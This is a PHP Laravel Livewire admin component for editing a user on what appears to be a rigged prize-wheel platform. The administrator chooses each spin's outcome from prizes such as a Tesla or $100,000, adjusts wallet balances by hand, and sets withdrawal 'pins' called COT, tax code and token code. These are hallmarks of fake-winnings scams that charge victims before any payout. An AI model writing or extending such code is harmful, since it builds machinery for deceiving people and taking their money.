<?php

namespace App\Livewire\Admin;

use App\Models\User;
use App\Models\SpinResults;
use Livewire\Component;

class EditUser extends Component
{
    public User $user;

    // Wallet Adjustment States
    public $amountToAdjust = 0;
    public $walletType = 'balance';

    // Spin Allocation States
    public $total_spins = 0;
    public $is_active = true;
    public $selected_prize_index = 0;
    public $used_spins = 0; // Add this property to track used spins

    public $cot, $tax_code, $token_code;

    // Your Prize Constant Mapping
    public $prizes = [
        0 => ['label' => 'TESLA CAR', 'icon' => '🚗', 'amount' => 1, 'color' => '#ef4444'],
        1 => ['label' => '$10,000', 'icon' => '💰', 'amount' => 10000, 'color' => '#facc15'],
        2 => ['label' => '$100,000', 'icon' => '💎', 'amount' => 100000, 'color' => '#22c55e'],
        3 => ['label' => 'LOSE', 'icon' => '❌', 'amount' => 0, 'color' => '#6b21a8'],
        4 => ['label' => '$60,000', 'icon' => '💵', 'amount' => 60000, 'color' => '#3b82f6'],
    ];

    public function mount(User $user)
    {
        $this->user = $user->load(['wallet', 'spinAllocations', 'spinResults', 'withdrawals']);

        $allocation = $this->user->spinAllocations->first();
        if ($allocation) {
            $this->total_spins = $allocation->total_spins;
            $this->used_spins = $allocation->used_spins; // Add this property to your class
            $this->is_active = (bool) $allocation->is_active;
        }

        // Load existing pins or set defaults
        $pins = $this->user->withdrawalPins;
        if ($pins) {
            $this->cot = $pins->cot;
            $this->tax_code = $pins->tax_code;
            $this->token_code = $pins->token_code;
        }
    }



    public function adjustBalance($action)
    {
        $this->validate(['amountToAdjust' => 'required|numeric|min:0.01']);
        $wallet = $this->user->wallet;

        if ($action === 'credit') {
            $wallet->increment($this->walletType, $this->amountToAdjust);
        } else {
            $wallet->decrement($this->walletType, $this->amountToAdjust);
        }

        $this->amountToAdjust = 0;
        $this->user->refresh();
        $this->dispatch('success', message: 'Wallet updated successfully.');
    }

    public function updateWithdrawalPins()
    {
        $this->user->withdrawalPins()->updateOrCreate(
            ['user_id' => $this->user->id],
            [
                'cot' => $this->cot,
                'tax_code' => $this->tax_code,
                'token_code' => $this->token_code,
            ]
        );

        $this->dispatch('success', message: 'Withdrawal verification pins updated.');
    }

    public function updateAllocation()
    {
        $this->user->spinAllocations()->updateOrCreate(
            ['user_id' => $this->user->id],
            [
                'total_spins' => $this->total_spins,
                'used_spins' => 0, // <--- THIS solves the logic flaw
                'is_active' => $this->is_active
            ]
        );

        // Clear old used results so the queue doesn't look cluttered
        $this->user->spinResults()->where('is_used', true)->delete();

        $this->user->refresh();
        $this->dispatch('success', message: 'Spins reset and updated to ' . $this->total_spins);
    }

    public function addSpinResult()
    {
        $allocation = $this->user->spinAllocations->first();

        if (!$allocation) {
            $this->dispatch('error', message: 'Create allocation first (Click Update).');
            return;
        }

        $prize = $this->prizes[$this->selected_prize_index];

        // Matches your SpinResults Schema
        SpinResults::create([
            'user_id' => $this->user->id,
            'spin_allocation_id' => $allocation->id,
            'prize_label' => $prize['label'],
            'prize_value' => $prize['icon'],
            'amount' => $prize['amount'],
            'slice_index' => $this->selected_prize_index,
            'color' => $prize['color'],
            'is_used' => false
        ]);

        $this->user->refresh();
        $this->dispatch('success', message: 'Spin result added to queue.');
    }

    public function clearUsedSpins()
    {
        $this->user->spinResults()->where('is_used', true)->delete();
        $this->user->refresh();
        $this->dispatch('success', message: 'Used spin history wiped.');
    }

    // This runs automatically when wire:model="is_active" changes
    public function updatedIsActive($value)
    {
        // 1. Update the database record
        $this->user->spinAllocations()->updateOrCreate(
            ['user_id' => $this->user->id],
            ['is_active' => (bool) $value]
        );

        // 2. Optional: Refresh user data to ensure UI sync
        $this->user->refresh();

        // 3. Dispatch success message
        $status = $value ? 'Enabled' : 'Disabled';
        $this->dispatch('success', message: "Spin Engine is now {$status}.");
    }

    public function deleteResult($id)
    {
        SpinResults::findOrFail($id)->delete();
        $this->user->refresh();
        $this->dispatch('success', message: 'Result removed.');
    }

    public function deleteUser()
    {
        $this->user->delete();
        return redirect()->route('admin.dashboard');
    }

    public function render()
    {
        return view('livewire.admin.edit-user');
    }
}
